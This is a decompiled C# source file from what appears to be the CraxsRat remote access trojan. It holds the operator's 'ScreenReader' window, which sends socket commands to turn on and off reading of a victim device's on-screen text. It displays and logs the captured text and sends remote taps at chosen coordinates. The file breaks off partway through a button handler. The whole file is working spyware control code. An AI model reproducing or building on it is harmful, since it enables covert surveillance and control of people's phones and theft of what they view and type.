using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class ScreenReader : Form
{
	public delegate void addLogback(object[] objs);

	[CompilerGenerated]
	internal sealed class _Closure_0024__52_002D0
	{
		public TextBox _0024VB_0024Local_Type;

		public string[] _0024VB_0024Local_sizearry;

		public ScreenReader _0024VB_0024Me;

		public _Closure_0024__52_002D0(_Closure_0024__52_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_Type = arg0._0024VB_0024Local_Type;
				_0024VB_0024Local_sizearry = arg0._0024VB_0024Local_sizearry;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0(object sender, EventArgs e)
		{
			try
			{
				Clipboard.SetText(_0024VB_0024Local_Type.Text);
				CraxsAlert.ShowSucess("Text Copied.");
				_0024VB_0024Local_Type.Tag = "E";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1(object sender, MouseEventArgs e)
		{
			try
			{
				string text = "clk:";
				_0024VB_0024Me.tiks = 0;
				_0024VB_0024Me.viewpanel.PointToClient(Control.MousePosition);
				text = text + Convert.ToInt32(Conversions.ToDouble(_0024VB_0024Local_sizearry[0])) + ":" + Convert.ToInt32(Conversions.ToDouble(_0024VB_0024Local_sizearry[1]));
				string[] array = _0024VB_0024Me.Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					_0024VB_0024Me.Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + _0024VB_0024Me.Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					_0024VB_0024Me.Classclient
				};
				_0024VB_0024Me.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private IContainer components;

	[AccessedThroughProperty("viewpanel")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Panel _viewpanel;

	[AccessedThroughProperty("disablebtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _disablebtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("enablebtn")]
	private DrakeUIButtonIcon _enablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	public Client Classclient;

	public string Title;

	public object firstclick;

	public ScreenLoger LogScreen;

	private int tiks;

	private bool Swaping;

	private bool isdown;

	private bool isclick;

	public Size ScreenSize;

	private List<Point> Trakpoint;

	internal virtual Panel viewpanel
	{
		[CompilerGenerated]
		get
		{
			return _viewpanel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Viewpanel_MouseDown;
			MouseEventHandler value3 = Viewpanel_MouseMove;
			MouseEventHandler value4 = Viewpanel_MouseUp;
			Panel panel = _viewpanel;
			if (panel != null)
			{
				panel.MouseDown -= value2;
				panel.MouseMove -= value3;
				panel.MouseUp -= value4;
			}
			_viewpanel = value;
			panel = _viewpanel;
			if (panel != null)
			{
				panel.MouseDown += value2;
				panel.MouseMove += value3;
				panel.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon disablebtn
	{
		[CompilerGenerated]
		get
		{
			return _disablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_disablebtn = value;
			drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon enablebtn
	{
		[CompilerGenerated]
		get
		{
			return _enablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu;
			DrakeUIButtonIcon drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_enablebtn = value;
			drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public ScreenReader()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq;
		base.FormClosing += ScreenReader_FormClosing;
		Title = "null";
		firstclick = true;
		tiks = 0;
		Swaping = false;
		isdown = false;
		isclick = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.viewpanel = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.disablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.enablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel2.SuspendLayout();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.viewpanel.BackColor = System.Drawing.Color.Black;
		this.viewpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewpanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.viewpanel.Location = new System.Drawing.Point(0, 69);
		this.viewpanel.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.viewpanel.Name = "viewpanel";
		this.viewpanel.Size = new System.Drawing.Size(564, 703);
		this.viewpanel.TabIndex = 0;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel2.Controls.Add(this.disablebtn);
		this.Panel2.Controls.Add(this.enablebtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(564, 69);
		this.Panel2.TabIndex = 0;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(196, 15);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 25;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(172, 32);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 57469;
		this.DrakeUIButtonIcon2.TabIndex = 22;
		this.DrakeUIButtonIcon2.Text = "Clear";
		this.disablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.disablebtn.FillColor = System.Drawing.Color.Black;
		this.disablebtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.disablebtn.FillPressColor = System.Drawing.Color.Black;
		this.disablebtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.disablebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.Location = new System.Drawing.Point(376, 15);
		this.disablebtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.disablebtn.Name = "disablebtn";
		this.disablebtn.Radius = 25;
		this.disablebtn.RectColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.disablebtn.RectHoverColor = System.Drawing.Color.White;
		this.disablebtn.RectPressColor = System.Drawing.Color.White;
		this.disablebtn.RectSelectedColor = System.Drawing.Color.White;
		this.disablebtn.Size = new System.Drawing.Size(172, 32);
		this.disablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.disablebtn.Symbol = 61534;
		this.disablebtn.TabIndex = 21;
		this.disablebtn.Text = "Disable";
		this.enablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.enablebtn.FillColor = System.Drawing.Color.Black;
		this.enablebtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.enablebtn.FillPressColor = System.Drawing.Color.Black;
		this.enablebtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.enablebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.Location = new System.Drawing.Point(16, 15);
		this.enablebtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.enablebtn.Name = "enablebtn";
		this.enablebtn.Radius = 25;
		this.enablebtn.RectColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.enablebtn.RectHoverColor = System.Drawing.Color.White;
		this.enablebtn.RectPressColor = System.Drawing.Color.White;
		this.enablebtn.RectSelectedColor = System.Drawing.Color.White;
		this.enablebtn.Size = new System.Drawing.Size(172, 32);
		this.enablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.enablebtn.Symbol = 61671;
		this.enablebtn.TabIndex = 20;
		this.enablebtn.Text = "Enable";
		this.Timer1.Interval = 1000;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon3);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.Location = new System.Drawing.Point(0, 772);
		this.Panel1.Margin = new System.Windows.Forms.Padding(4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(564, 69);
		this.Panel1.TabIndex = 1;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(196, 15);
		this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 25;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(172, 32);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 57353;
		this.DrakeUIButtonIcon1.TabIndex = 22;
		this.DrakeUIButtonIcon1.Text = "Home";
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(376, 15);
		this.DrakeUIButtonIcon3.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
		this.DrakeUIButtonIcon3.Radius = 25;
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(172, 32);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.Symbol = 61641;
		this.DrakeUIButtonIcon3.TabIndex = 21;
		this.DrakeUIButtonIcon3.Text = "Recent";
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(16, 15);
		this.DrakeUIButtonIcon4.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 25;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(172, 32);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61696;
		this.DrakeUIButtonIcon4.TabIndex = 20;
		this.DrakeUIButtonIcon4.Text = "Back";
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(564, 841);
		base.Controls.Add(this.viewpanel);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel2);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		base.Name = "ScreenReader";
		base.ShowIcon = false;
		this.Text = "ScreenReader (Cobra)";
		this.Panel2.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu(object sender, EventArgs e)
	{
		if (Classclient == null)
		{
			return;
		}
		try
		{
			if (LogScreen == null)
			{
				LogScreen = new ScreenLoger();
				LogScreen.Show(this);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		TcpClient myClient = Classclient.myClient;
		string[] array = Classclient.Keys.Split(':');
		object[] parametersObjects = new object[4]
		{
			myClient,
			SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
			Codes.Encoding().GetBytes("null"),
			Classclient
		};
		Classclient.SendMessage(parametersObjects);
		Timer1.Enabled = true;
		enablebtn.Enabled = false;
		disablebtn.Enabled = true;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			enablebtn.Enabled = true;
			disablebtn.Enabled = false;
		}
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(object[] objs)
	{
		checked
		{
			try
			{
				if (viewpanel.InvokeRequired)
				{
					addLogback method = CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh;
					viewpanel.Invoke(method, new object[1] { objs });
					return;
				}
				string text = Conversions.ToString(objs[0]);
				if (Operators.CompareString(text, "CLR", TextCompare: false) == 0)
				{
					viewpanel.Controls.Clear();
					return;
				}
				string[] array = text.Split('^');
				int num = array.Length - 1;
				_Closure_0024__52_002D0 closure_0024__52_002D = default(_Closure_0024__52_002D0);
				for (int i = 0; i <= num; i++)
				{
					closure_0024__52_002D = new _Closure_0024__52_002D0(closure_0024__52_002D);
					closure_0024__52_002D._0024VB_0024Me = this;
					string[] array2 = array[i].Split(':');
					closure_0024__52_002D._0024VB_0024Local_Type = new TextBox();
					string text2 = array2[0];
					if (string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2))
					{
						continue;
					}
					LogScreen.Logs.AppendText("> " + text2 + "\r\n");
					closure_0024__52_002D._0024VB_0024Local_sizearry = array2[1].Split('~');
					string[] array3 = array2[2].Split('~');
					string[] array4 = null;
					try
					{
						array4 = array2[3].Split('~');
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						array4 = null;
						ProjectData.ClearProjectError();
					}
					int num2 = Conversions.ToInteger(array3[0]);
					int num3 = Conversions.ToInteger(array3[1]);
					if (ScreenSize == default(Size))
					{
						ScreenSize = new Size(Conversions.ToInteger(array3[0]), Conversions.ToInteger(array3[1]));
					}
					closure_0024__52_002D._0024VB_0024Local_Type.Location = new Point((int)Math.Round(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[0]) * ((double)viewpanel.Width / (double)num2)), (int)Math.Round(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[1]) * ((double)viewpanel.Height / (double)num3)));
					foreach (Control control in viewpanel.Controls)
					{
						try
						{
							if (closure_0024__52_002D._0024VB_0024Local_Type.Bounds.IntersectsWith(control.Bounds) && closure_0024__52_002D._0024VB_0024Local_Type.Text.Equals(control.Text, StringComparison.CurrentCultureIgnoreCase))
							{
								viewpanel.Controls.Remove(control);
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					closure_0024__52_002D._0024VB_0024Local_Type.Text = text2;
					if (array4 == null)
					{
						Size size = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
						closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size.Width, 20);
					}
					else
					{
						Size size2 = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
						closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size2.Width, Conversions.ToInteger(array4[1]));
					}
					closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.None;
					closure_0024__52_002D._0024VB_0024Local_Type.BackColor = Color.Black;
					closure_0024__52_002D._0024VB_0024Local_Type.ForeColor = Color.White;
					closure_0024__52_002D._0024VB_0024Local_Type.ReadOnly = true;
					closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.FixedSingle;
					closure_0024__52_002D._0024VB_0024Local_Type.DoubleClick += closure_0024__52_002D._Lambda_0024__0;
					closure_0024__52_002D._0024VB_0024Local_Type.MouseClick += closure_0024__52_002D._Lambda_0024__1;
					viewpanel.Controls.Add(closure_0024__52_002D._0024VB_0024Local_Type);
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq(object sender, EventArgs e)
	{
		Timer1.Enabled = true;
		Timer1.Start();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			viewpanel.Controls.Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (viewpanel.Controls.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = viewpanel.Controls.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(viewpanel.Controls[i].Tag, "E", TextCompare: false))
					{
						viewpanel.Controls.Remove(viewpanel.Controls[i]);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		Timer1.Stop();
		Timer1.Enabled = false;
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			try
			{
